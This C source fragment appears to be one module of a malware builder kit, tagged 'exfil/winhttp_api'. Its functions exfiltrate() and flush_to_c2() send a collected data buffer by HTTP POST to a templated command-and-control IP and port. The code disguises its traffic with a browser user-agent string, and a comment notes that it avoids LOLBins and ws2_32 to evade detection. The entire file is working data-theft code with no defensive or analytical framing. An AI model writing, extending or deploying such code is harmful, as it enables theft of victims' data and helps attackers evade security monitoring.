// chunk: exfil/winhttp_api
// depends: core/emit_buffer
// provides: exfiltrate, flush_to_c2
// headers: winhttp.h
// libs: winhttp
// note: direct HTTP POST via WinHTTP API — no LOLBins, no ws2_32

#ifndef CHUNK_WINHTTP_API
#define CHUNK_WINHTTP_API

#include <winhttp.h>

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}

static BOOL exfiltrate(const char *ip, int port, const char *data, DWORD len) {
    if (!data || len == 0) return FALSE;

    wchar_t wip[64];
    MultiByteToWideChar(CP_ACP, 0, ip, -1, wip, 64);

    HINTERNET session = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (!session) return FALSE;

    HINTERNET conn = WinHttpConnect(session, wip, (INTERNET_PORT)port, 0);
    if (!conn) { WinHttpCloseHandle(session); return FALSE; }

    HINTERNET req = WinHttpOpenRequest(conn, L"POST", L"/", NULL,
                                        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!req) { WinHttpCloseHandle(conn); WinHttpCloseHandle(session); return FALSE; }

    BOOL ok = WinHttpSendRequest(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                  (LPVOID)data, len, len, 0);
    if (ok) WinHttpReceiveResponse(req, NULL);

    WinHttpCloseHandle(req);
    WinHttpCloseHandle(conn);
    WinHttpCloseHandle(session);
    return ok;
}

static void flush_to_c2(void) {
    if (g_pos > 0) {
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);
        g_pos = 0;
    }
}

#endif
